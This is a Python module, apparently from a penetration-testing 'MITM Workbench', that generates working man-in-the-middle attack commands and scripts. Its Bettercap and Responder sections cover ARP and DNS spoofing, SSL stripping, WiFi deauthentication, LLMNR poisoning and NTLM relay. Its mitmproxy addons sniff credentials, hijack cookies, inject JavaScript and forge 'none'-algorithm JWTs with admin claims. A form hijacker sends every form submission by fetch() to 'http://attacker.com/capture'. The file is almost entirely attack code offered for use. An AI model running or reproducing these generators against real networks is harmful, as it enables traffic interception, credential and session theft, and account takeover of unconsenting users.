"""
MITM External Tools Integration

Provides command generation and integration for external tools:
- Bettercap: Advanced MITM framework
- Responder: LLMNR/NBT-NS/MDNS poisoner
- mitmproxy: Scriptable HTTP/HTTPS proxy
"""

import json
import logging
import os
import tempfile
from dataclasses import dataclass, field
from typing import Any, Dict, List, Optional

logger = logging.getLogger(__name__)


# ============================================================================
# Bettercap Integration
# ============================================================================

class BettercapCommandGenerator:
    """
    Generates Bettercap commands and caplets for various MITM attacks.

    Bettercap is a powerful network attack framework supporting:
    - ARP spoofing
    - DNS spoofing
    - HTTP/HTTPS proxying
    - Wi-Fi attacks
    - BLE attacks
    """

    def __init__(self):
        self.default_interface = "eth0"

    def generate_arp_spoof(
        self,
        target_ip: str,
        gateway_ip: str,
        interface: Optional[str] = None,
        full_duplex: bool = True
    ) -> List[str]:
        """Generate ARP spoofing commands."""
        iface = interface or self.default_interface

        commands = [
            f"# ARP Spoofing Attack",
            f"# Target: {target_ip}, Gateway: {gateway_ip}",
            f"bettercap -iface {iface}",
            "",
            f"# In bettercap shell:",
            f"set arp.spoof.targets {target_ip}",
            f"set arp.spoof.internal true",
        ]

        if full_duplex:
            commands.append("set arp.spoof.fullduplex true")

        commands.extend([
            "arp.spoof on",
            "",
            "# To stop:",
            "arp.spoof off"
        ])

        return commands

    def generate_dns_spoof(
        self,
        domains: List[str],
        redirect_ip: str,
        interface: Optional[str] = None
    ) -> List[str]:
        """Generate DNS spoofing commands."""
        iface = interface or self.default_interface
        domain_list = ",".join(domains)

        commands = [
            f"# DNS Spoofing Attack",
            f"# Domains: {domain_list}",
            f"# Redirect to: {redirect_ip}",
            f"bettercap -iface {iface}",
            "",
            f"# In bettercap shell:",
            f"set dns.spoof.domains {domain_list}",
            f"set dns.spoof.address {redirect_ip}",
            f"set dns.spoof.all true",
            "dns.spoof on",
            "",
            "# To stop:",
            "dns.spoof off"
        ]

        return commands

    def generate_https_proxy(
        self,
        target_ip: str,
        sslstrip: bool = True,
        interface: Optional[str] = None
    ) -> List[str]:
        """Generate HTTPS proxy/sslstrip commands."""
        iface = interface or self.default_interface

        commands = [
            f"# HTTPS Proxy with SSL Strip",
            f"# Target: {target_ip}",
            f"bettercap -iface {iface}",
            "",
            f"# Enable ARP spoofing first:",
            f"set arp.spoof.targets {target_ip}",
            "arp.spoof on",
            "",
            "# Enable HTTP proxy:",
            "set http.proxy.sslstrip true" if sslstrip else "set http.proxy.sslstrip false",
            "http.proxy on",
            "",
            "# Enable HTTPS proxy:",
            "https.proxy on",
            "",
            "# Capture credentials:",
            "set http.proxy.script /path/to/script.js",
        ]

        return commands

    def generate_wifi_deauth(
        self,
        target_bssid: str,
        client_mac: Optional[str] = None,
        interface: Optional[str] = None
    ) -> List[str]:
        """Generate WiFi deauthentication commands."""
        iface = interface or "wlan0mon"

        commands = [
            f"# WiFi Deauthentication Attack",
            f"# Target BSSID: {target_bssid}",
            f"bettercap -iface {iface}",
            "",
            "# Enable wifi module:",
            "wifi.recon on",
            "",
            f"# Deauth specific client:" if client_mac else "# Deauth all clients:",
            f"wifi.deauth {target_bssid}" + (f" {client_mac}" if client_mac else ""),
        ]

        return commands

    def generate_caplet(
        self,
        attack_config: Dict[str, Any]
    ) -> str:
        """
        Generate a Bettercap caplet file for automated attacks.

        A caplet is a script that automates Bettercap commands.
        """
        caplet_lines = [
            "# Bettercap Caplet - Auto-generated",
            "# Generated by VRAgent MITM Workbench",
            "",
        ]

        # Network settings
        if attack_config.get("arp_spoof"):
            target = attack_config.get("target_ip", "")
            caplet_lines.extend([
                f"set arp.spoof.targets {target}",
                "set arp.spoof.fullduplex true",
                "arp.spoof on",
                ""
            ])

        # DNS spoofing
        if attack_config.get("dns_spoof"):
            domains = attack_config.get("dns_domains", [])
            redirect = attack_config.get("dns_redirect", "")
            if domains and redirect:
                caplet_lines.extend([
                    f"set dns.spoof.domains {','.join(domains)}",
                    f"set dns.spoof.address {redirect}",
                    "dns.spoof on",
                    ""
                ])

        # HTTP/HTTPS proxy
        if attack_config.get("http_proxy"):
            caplet_lines.extend([
                "set http.proxy.sslstrip true",
                "http.proxy on",
                "https.proxy on",
                ""
            ])

        # Net sniff
        if attack_config.get("sniff"):
            caplet_lines.extend([
                "set net.sniff.local true",
                "set net.sniff.verbose true",
                "net.sniff on",
                ""
            ])

        # Custom script
        if attack_config.get("proxy_script"):
            caplet_lines.append(f"set http.proxy.script {attack_config['proxy_script']}")

        return "\n".join(caplet_lines)

    def generate_http_proxy_script(
        self,
        inject_payload: Optional[str] = None,
        capture_forms: bool = True,
        log_requests: bool = True
    ) -> str:
        """Generate a Bettercap HTTP proxy JavaScript module."""
        script = """
// Bettercap HTTP Proxy Script
// Generated by VRAgent MITM Workbench

function onRequest(req, res) {
"""
        if log_requests:
            script += """
    // Log all requests
    log_info("[REQUEST] " + req.Method + " " + req.Hostname + req.Path);
"""

        if capture_forms:
            script += """
    // Capture form data
    if (req.Method == "POST") {
        var body = req.ReadBody();
        if (body.length > 0) {
            log_warn("[FORM DATA] " + req.Hostname + req.Path + " : " + body);
        }
    }
"""

        script += """
}

function onResponse(req, res) {
"""
        if inject_payload:
            script += f"""
    // Inject payload into HTML responses
    if (res.ContentType.indexOf("text/html") == 0) {{
        var body = res.ReadBody();
        body = body.replace("</body>", "{inject_payload}</body>");
        res.Body = body;
    }}
"""

        script += """
    // Log response
    log_info("[RESPONSE] " + req.Method + " " + req.Hostname + req.Path + " => " + res.Status);
}
"""
        return script


# ============================================================================
# Responder Integration
# ============================================================================

class ResponderCommandGenerator:
    """
    Generates Responder commands for LLMNR/NBT-NS/MDNS poisoning.

    Responder is used for:
    - LLMNR poisoning
    - NBT-NS poisoning
    - MDNS poisoning
    - WPAD abuse
    - NTLMv2 hash capture
    """

    def __init__(self):
        self.default_interface = "eth0"

    def generate_command(
        self,
        interface: Optional[str] = None,
        analyze_mode: bool = False,
        wpad: bool = True,
        force_wpad_auth: bool = False,
        fingerprint: bool = True,
        verbose: bool = False
    ) -> List[str]:
        """Generate Responder command with options."""
        iface = interface or self.default_interface

        commands = [
            "# Responder - LLMNR/NBT-NS/MDNS Poisoner",
            "",
        ]

        cmd = f"responder -I {iface}"

        if analyze_mode:
            cmd += " -A"
            commands.append("# Analyze mode - no poisoning, just monitoring")
        else:
            if wpad:
                cmd += " -w"
            if force_wpad_auth:
                cmd += " -F"
            if fingerprint:
                cmd += " -f"

        if verbose:
            cmd += " -v"

        commands.extend([
            cmd,
            "",
            "# Common options:",
            "#   -I eth0     Interface to use",
            "#   -w          Enable WPAD rogue proxy server",
            "#   -r          Enable answers for netbios wredir suffix queries",
            "#   -d          Enable answers for netbios domain suffix queries",
            "#   -f          Fingerprint hosts before poisoning",
            "#   -F          Force NTLM/Basic auth for WPAD",
            "#   -P          Force Basic auth for proxy authentication",
            "#   -A          Analyze mode (no poisoning)",
            "#   -v          Verbose mode",
            "",
            "# Captured hashes are stored in:",
            "#   /usr/share/responder/logs/",
        ])

        return commands

    def generate_relay_command(
        self,
        target: str,
        interface: Optional[str] = None
    ) -> List[str]:
        """Generate ntlmrelayx command for relay attacks."""
        iface = interface or self.default_interface

        commands = [
            "# NTLM Relay Attack",
            f"# Target: {target}",
            "",
            "# First, disable SMB and HTTP in Responder.conf",
            "# Then run Responder in analyze mode:",
            f"responder -I {iface} -A",
            "",
            "# In another terminal, run ntlmrelayx:",
            f"ntlmrelayx.py -tf targets.txt -smb2support",
            "",
            "# Or relay to specific target:",
            f"ntlmrelayx.py -t {target} -smb2support",
            "",
            "# For LDAP relay:",
            f"ntlmrelayx.py -t ldap://{target} --escalate-user <user>",
        ]

        return commands

    def generate_analyze_command(
        self,
        interface: Optional[str] = None
    ) -> List[str]:
        """Generate Responder analyze mode command."""
        iface = interface or self.default_interface

        commands = [
            "# Responder Analyze Mode",
            "# Monitors network for poisoning opportunities without attacking",
            "",
            f"responder -I {iface} -A -v",
            "",
            "# This will show:",
            "#   - LLMNR/NBT-NS queries",
            "#   - Potential targets",
            "#   - Service fingerprints",
        ]

        return commands


# ============================================================================
# mitmproxy Integration
# ============================================================================

class MitmproxyScriptGenerator:
    """
    Generates mitmproxy addon scripts for traffic manipulation.

    mitmproxy provides:
    - HTTP/HTTPS interception
    - WebSocket interception
    - Scriptable request/response modification
    - Traffic recording and replay
    """

    def __init__(self):
        pass

    def generate_addon_script(
        self,
        tool_id: str,
        options: Optional[Dict[str, Any]] = None
    ) -> str:
        """Generate a mitmproxy addon script for a specific tool."""
        options = options or {}

        generators = {
            "sslstrip": self._generate_sslstrip_addon,
            "credential_sniffer": self._generate_credential_sniffer_addon,
            "script_injector": self._generate_script_injector_addon,
            "cookie_hijacker": self._generate_cookie_hijacker_addon,
            "form_hijacker": self._generate_form_hijacker_addon,
            "jwt_manipulator": self._generate_jwt_manipulator_addon,
            "header_manipulator": self._generate_header_manipulator_addon,
        }

        generator = generators.get(tool_id)
        if generator:
            return generator(options)

        return self._generate_generic_addon(tool_id, options)

    def _generate_sslstrip_addon(self, options: Dict[str, Any]) -> str:
        """Generate SSL stripping addon."""
        return '''"""
mitmproxy SSL Strip Addon
Downgrades HTTPS links to HTTP in responses.
"""
import re
from mitmproxy import http

class SSLStripper:
    def response(self, flow: http.HTTPFlow):
        # Only process HTML responses
        if flow.response and "text/html" in flow.response.headers.get("content-type", ""):
            # Get response body
            body = flow.response.get_text()

            # Replace HTTPS with HTTP
            body = re.sub(r'https://', 'http://', body)

            # Update response
            flow.response.set_text(body)

            # Remove HSTS header
            if "Strict-Transport-Security" in flow.response.headers:
                del flow.response.headers["Strict-Transport-Security"]

            print(f"[SSLStrip] Modified: {flow.request.pretty_url}")

addons = [SSLStripper()]
'''

    def _generate_credential_sniffer_addon(self, options: Dict[str, Any]) -> str:
        """Generate credential sniffing addon."""
        return '''"""
mitmproxy Credential Sniffer Addon
Captures credentials from form submissions and auth headers.
"""
import re
import json
from mitmproxy import http
from urllib.parse import parse_qs

class CredentialSniffer:
    def __init__(self):
        self.captured = []
        self.patterns = [
            r'password', r'passwd', r'pwd', r'pass',
            r'username', r'user', r'login', r'email',
            r'token', r'api_key', r'apikey', r'secret'
        ]

    def request(self, flow: http.HTTPFlow):
        # Check Authorization header
        auth = flow.request.headers.get("Authorization", "")
        if auth:
            self._log_credential("Authorization Header", auth, flow.request.pretty_url)

        # Check for form data
        if flow.request.method == "POST":
            content_type = flow.request.headers.get("content-type", "")

            if "application/x-www-form-urlencoded" in content_type:
                body = flow.request.get_text()
                params = parse_qs(body)
                self._check_params(params, flow.request.pretty_url)

            elif "application/json" in content_type:
                try:
                    data = json.loads(flow.request.get_text())
                    self._check_json(data, flow.request.pretty_url)
                except:
                    pass

    def _check_params(self, params, url):
        for key, values in params.items():
            if any(re.search(p, key, re.I) for p in self.patterns):
                self._log_credential(key, values[0] if values else "", url)

    def _check_json(self, data, url, prefix=""):
        if isinstance(data, dict):
            for key, value in data.items():
                full_key = f"{prefix}.{key}" if prefix else key
                if any(re.search(p, key, re.I) for p in self.patterns):
                    self._log_credential(full_key, str(value), url)
                elif isinstance(value, dict):
                    self._check_json(value, url, full_key)

    def _log_credential(self, field, value, url):
        entry = {"field": field, "value": value[:100], "url": url}
        self.captured.append(entry)
        print(f"[CREDENTIAL] {field}: {value[:50]}... @ {url}")

addons = [CredentialSniffer()]
'''

    def _generate_script_injector_addon(self, options: Dict[str, Any]) -> str:
        """Generate script injection addon."""
        payload = options.get("payload", "console.log('Injected by MITM');")

        return f'''"""
mitmproxy Script Injector Addon
Injects JavaScript into HTML responses.
"""
from mitmproxy import http

class ScriptInjector:
    def __init__(self):
        self.payload = """<script>{payload}</script>"""

    def response(self, flow: http.HTTPFlow):
        if flow.response and "text/html" in flow.response.headers.get("content-type", ""):
            body = flow.response.get_text()

            # Inject before </body>
            if "</body>" in body.lower():
                body = body.replace("</body>", self.payload + "</body>")
                body = body.replace("</BODY>", self.payload + "</BODY>")
                flow.response.set_text(body)
                print(f"[INJECT] Script injected: {{flow.request.pretty_url}}")

addons = [ScriptInjector()]
'''

    def _generate_cookie_hijacker_addon(self, options: Dict[str, Any]) -> str:
        """Generate cookie hijacking addon."""
        return '''"""
mitmproxy Cookie Hijacker Addon
Captures and logs all cookies, strips security flags.
"""
from mitmproxy import http

class CookieHijacker:
    def __init__(self):
        self.captured_cookies = []

    def request(self, flow: http.HTTPFlow):
        # Capture cookies from requests
        cookies = flow.request.headers.get("Cookie", "")
        if cookies:
            self._log_cookies(cookies, flow.request.pretty_url, "request")

    def response(self, flow: http.HTTPFlow):
        # Capture and modify Set-Cookie headers
        for header in flow.response.headers.get_all("Set-Cookie"):
            self._log_cookies(header, flow.request.pretty_url, "response")

            # Strip security flags
            modified = self._strip_flags(header)
            # Note: mitmproxy doesn't easily support modifying individual headers
            # This is for demonstration - real implementation would rebuild headers

    def _log_cookies(self, cookies, url, direction):
        entry = {"cookies": cookies, "url": url, "direction": direction}
        self.captured_cookies.append(entry)
        print(f"[COOKIE-{direction.upper()}] {url}: {cookies[:100]}...")

    def _strip_flags(self, cookie):
        # Remove security flags
        import re
        cookie = re.sub(r';\\s*HttpOnly', '', cookie, flags=re.I)
        cookie = re.sub(r';\\s*Secure', '', cookie, flags=re.I)
        cookie = re.sub(r';\\s*SameSite=\\w+', '', cookie, flags=re.I)
        return cookie

addons = [CookieHijacker()]
'''

    def _generate_form_hijacker_addon(self, options: Dict[str, Any]) -> str:
        """Generate form hijacking addon."""
        capture_url = options.get("capture_url", "http://attacker.com/capture")

        return f'''"""
mitmproxy Form Hijacker Addon
Modifies form actions to capture submissions.
"""
import re
from mitmproxy import http

class FormHijacker:
    def __init__(self):
        self.capture_url = "{capture_url}"

    def response(self, flow: http.HTTPFlow):
        if flow.response and "text/html" in flow.response.headers.get("content-type", ""):
            body = flow.response.get_text()

            # Add onsubmit handler to forms
            pattern = r'<form([^>]*)>'
            replacement = r'<form\\1 onsubmit="fetch(\\'{{self.capture_url}}\\',{{method:\\'POST\\',body:new URLSearchParams(new FormData(this))}})">'

            body = re.sub(pattern, replacement, body, flags=re.I)
            flow.response.set_text(body)

            if "<form" in body.lower():
                print(f"[FORM-HIJACK] Modified forms in: {{flow.request.pretty_url}}")

addons = [FormHijacker()]
'''

    def _generate_jwt_manipulator_addon(self, options: Dict[str, Any]) -> str:
        """Generate JWT manipulation addon."""
        return '''"""
mitmproxy JWT Manipulator Addon
Intercepts and modifies JWT tokens.
"""
import base64
import json
import re
from mitmproxy import http

class JWTManipulator:
    def request(self, flow: http.HTTPFlow):
        auth = flow.request.headers.get("Authorization", "")

        if auth.startswith("Bearer "):
            token = auth[7:]
            modified = self._manipulate_jwt(token)

            if modified:
                flow.request.headers["Authorization"] = f"Bearer {modified}"
                print(f"[JWT] Modified token for: {flow.request.pretty_url}")

    def _manipulate_jwt(self, token):
        try:
            parts = token.split(".")
            if len(parts) != 3:
                return None

            # Decode header
            header = json.loads(self._b64decode(parts[0]))
            payload = json.loads(self._b64decode(parts[1]))

            # Log original
            print(f"[JWT] Original header: {header}")
            print(f"[JWT] Original payload: {payload}")

            # Attempt none algorithm attack
            header["alg"] = "none"

            # Modify claims
            if "role" in payload:
                payload["role"] = "admin"
            if "admin" in payload:
                payload["admin"] = True

            # Rebuild token
            new_header = self._b64encode(json.dumps(header))
            new_payload = self._b64encode(json.dumps(payload))

            return f"{new_header}.{new_payload}."

        except Exception as e:
            print(f"[JWT] Error: {e}")
            return None

    def _b64decode(self, data):
        # Add padding
        padding = 4 - len(data) % 4
        if padding != 4:
            data += "=" * padding
        return base64.urlsafe_b64decode(data).decode()

    def _b64encode(self, data):
        return base64.urlsafe_b64encode(data.encode()).decode().rstrip("=")

addons = [JWTManipulator()]
'''

    def _generate_header_manipulator_addon(self, options: Dict[str, Any]) -> str:
        """Generate header manipulation addon."""
        add_headers = options.get("add_headers", {})
        remove_headers = options.get("remove_headers", [])

        add_headers_code = "\n        ".join([
            f'flow.response.headers["{k}"] = "{v}"'
            for k, v in add_headers.items()
        ])

        remove_headers_code = "\n        ".join([
            f'if "{h}" in flow.response.headers: del flow.response.headers["{h}"]'
            for h in remove_headers
        ])

        return f'''"""
mitmproxy Header Manipulator Addon
Modifies request and response headers.
"""
from mitmproxy import http

class HeaderManipulator:
    def response(self, flow: http.HTTPFlow):
        # Remove headers
        {remove_headers_code}

        # Add/modify headers
        {add_headers_code}

        print(f"[HEADERS] Modified: {{flow.request.pretty_url}}")

addons = [HeaderManipulator()]
'''

    def _generate_generic_addon(self, tool_id: str, options: Dict[str, Any]) -> str:
        """Generate a generic addon template."""
        return f'''"""
mitmproxy Generic Addon - {tool_id}
Custom traffic manipulation addon.
"""
from mitmproxy import http

class GenericAddon:
    def request(self, flow: http.HTTPFlow):
        # Modify requests here
        print(f"[{tool_id.upper()}] Request: {{flow.request.pretty_url}}")

    def response(self, flow: http.HTTPFlow):
        # Modify responses here
        print(f"[{tool_id.upper()}] Response: {{flow.request.pretty_url}}")

addons = [GenericAddon()]
'''

    def generate_launch_command(
        self,
        mode: str = "regular",
        listen_host: str = "127.0.0.1",
        listen_port: int = 8080,
        script_path: Optional[str] = None,
        ssl_insecure: bool = False
    ) -> List[str]:
        """Generate mitmproxy launch command."""
        commands = ["# mitmproxy Launch Command", ""]

        if mode == "transparent":
            cmd = f"mitmproxy --mode transparent --listen-host {listen_host} --listen-port {listen_port}"
        elif mode == "socks":
            cmd = f"mitmproxy --mode socks5 --listen-host {listen_host} --listen-port {listen_port}"
        elif mode == "reverse":
            cmd = f"mitmproxy --mode reverse:http://target:80 --listen-host {listen_host} --listen-port {listen_port}"
        else:
            cmd = f"mitmproxy --listen-host {listen_host} --listen-port {listen_port}"

        if script_path:
            cmd += f" -s {script_path}"

        if ssl_insecure:
            cmd += " --ssl-insecure"

        commands.append(cmd)
        commands.extend([
            "",
            "# Or use mitmdump for non-interactive mode:",
            cmd.replace("mitmproxy", "mitmdump"),
            "",
            "# Or use mitmweb for web interface:",
            cmd.replace("mitmproxy", "mitmweb"),
        ])

        return commands


# ============================================================================
# External Tool Manager
# ============================================================================

class ExternalToolManager:
    """
    Manages external tool integrations.

    Provides unified interface for generating commands
    and scripts for external MITM tools.
    """

    def __init__(self):
        self.bettercap = BettercapCommandGenerator()
        self.responder = ResponderCommandGenerator()
        self.mitmproxy = MitmproxyScriptGenerator()

    def generate_command(
        self,
        tool: str,
        attack_type: str,
        options: Dict[str, Any]
    ) -> Dict[str, Any]:
        """
        Generate commands for an external tool.

        Args:
            tool: Tool name (bettercap, responder, mitmproxy)
            attack_type: Type of attack
            options: Configuration options
        """
        result = {
            "tool": tool,
            "attack_type": attack_type,
            "commands": [],
            "script": None,
            "notes": []
        }

        if tool == "bettercap":
            result.update(self._generate_bettercap(attack_type, options))
        elif tool == "responder":
            result.update(self._generate_responder(attack_type, options))
        elif tool == "mitmproxy":
            result.update(self._generate_mitmproxy(attack_type, options))
        else:
            result["error"] = f"Unknown tool: {tool}"

        return result

    def _generate_bettercap(
        self,
        attack_type: str,
        options: Dict[str, Any]
    ) -> Dict[str, Any]:
        """Generate Bettercap commands."""
        if attack_type == "arp_spoof":
            commands = self.bettercap.generate_arp_spoof(
                target_ip=options.get("target_ip", ""),
                gateway_ip=options.get("gateway_ip", ""),
                interface=options.get("interface"),
                full_duplex=options.get("full_duplex", True)
            )
        elif attack_type == "dns_spoof":
            commands = self.bettercap.generate_dns_spoof(
                domains=options.get("domains", []),
                redirect_ip=options.get("redirect_ip", ""),
                interface=options.get("interface")
            )
        elif attack_type == "https_proxy":
            commands = self.bettercap.generate_https_proxy(
                target_ip=options.get("target_ip", ""),
                sslstrip=options.get("sslstrip", True),
                interface=options.get("interface")
            )
        else:
            commands = [f"# Unknown attack type: {attack_type}"]

        return {
            "commands": commands,
            "notes": ["Requires root/admin privileges", "Target must be on same network"]
        }

    def _generate_responder(
        self,
        attack_type: str,
        options: Dict[str, Any]
    ) -> Dict[str, Any]:
        """Generate Responder commands."""
        if attack_type == "poison":
            commands = self.responder.generate_command(
                interface=options.get("interface"),
                wpad=options.get("wpad", True),
                fingerprint=options.get("fingerprint", True)
            )
        elif attack_type == "analyze":
            commands = self.responder.generate_analyze_command(
                interface=options.get("interface")
            )
        elif attack_type == "relay":
            commands = self.responder.generate_relay_command(
                target=options.get("target", ""),
                interface=options.get("interface")
            )
        else:
            commands = [f"# Unknown attack type: {attack_type}"]

        return {
            "commands": commands,
            "notes": ["Effective against Windows networks", "Captures NTLMv2 hashes"]
        }

    def _generate_mitmproxy(
        self,
        attack_type: str,
        options: Dict[str, Any]
    ) -> Dict[str, Any]:
        """Generate mitmproxy commands and scripts."""
        # Generate addon script
        script = self.mitmproxy.generate_addon_script(attack_type, options)

        # Generate launch command
        commands = self.mitmproxy.generate_launch_command(
            mode=options.get("mode", "regular"),
            listen_host=options.get("listen_host", "127.0.0.1"),
            listen_port=options.get("listen_port", 8080),
            script_path=options.get("script_path", "/tmp/addon.py")
        )

        return {
            "commands": commands,
            "script": script,
            "notes": ["Save script to file before running", "Install mitmproxy: pip install mitmproxy"]
        }

    def get_available_attacks(self) -> Dict[str, List[str]]:
        """Get available attack types for each tool."""
        return {
            "bettercap": [
                "arp_spoof",
                "dns_spoof",
                "https_proxy",
                "wifi_deauth",
                "caplet"
            ],
            "responder": [
                "poison",
                "analyze",
                "relay"
            ],
            "mitmproxy": [
                "sslstrip",
                "credential_sniffer",
                "script_injector",
                "cookie_hijacker",
                "form_hijacker",
                "jwt_manipulator",
                "header_manipulator"
            ]
        }
